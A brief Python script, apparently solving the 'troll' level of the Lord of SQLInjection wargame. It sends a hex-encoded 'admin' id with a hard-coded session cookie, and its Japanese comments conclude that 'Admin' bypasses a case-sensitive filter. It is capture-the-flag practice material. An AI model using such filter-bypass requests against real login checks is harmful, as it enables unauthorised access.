#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import re
from termcolor import colored
from bs4 import BeautifulSoup as bs
import sys, getopt
import urllib.parse

url = "https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php"
parameter = 'id'
cookie = dict(PHPSESSID='lqjdocrtrts7s5gl84ruvmc5aa')

sql = "0x61646d696e"
sql = urllib.parse.quote(sql)
query_url = "%s?%s=%s" % (url,parameter,sql)
print("[*]%s" % query_url)

http_request=requests.get(query_url,cookies=cookie)
res = bs(http_request.text,"html.parser")


# シングルクオートと文字列adminが入力できないようになっている。
# 0x61646d696e と入れても、括弧内に入ってるため、効果がないようだ...

# 答え　Admin : Caseチェックがない